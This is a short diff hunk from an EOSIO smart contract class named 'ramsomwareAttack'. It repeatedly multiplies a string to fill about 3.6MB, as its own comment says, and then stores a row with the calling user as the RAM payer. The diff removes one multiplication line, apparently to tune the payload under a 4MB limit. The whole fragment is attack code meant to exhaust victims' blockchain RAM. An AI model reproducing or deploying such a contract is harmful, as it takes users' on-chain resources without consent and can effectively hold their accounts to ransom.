@@ -26,7 +26,6 @@ class [[eosio::contract]] ramsomwareAttack : public eosio::contract {
             A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A; 
             A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A; 
             A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A; 
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A; 
             // 3.6MB CONSUME (MAX 4MB)
             address_index addresses(_self, _self.value);
             addresses.emplace(user, [&](auto & row)
